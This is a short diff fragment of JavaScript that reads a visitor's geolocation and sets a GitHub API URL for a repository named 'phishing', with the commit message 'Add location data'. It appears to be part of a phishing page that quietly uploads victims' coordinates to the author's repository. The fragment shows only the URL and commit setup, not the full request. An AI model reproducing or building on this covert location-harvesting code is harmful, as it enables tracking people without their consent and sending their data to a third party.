@@ -32,7 +32,7 @@ function showPosition(position) {
   "<br>Longitude: " + position.coords.longitude);
 }
 ////////////////////////////////////////////////////////////////////////////////////
-const url = "https://api.github.com/repos/{OWNER}/{REPO}/contents/{PATH_TO_FILE}";
+const url = "https://api.github.com/repos/neuropathy0829/phishing/contents/test.txt";
 
 const data = {
   message: "Add location data",
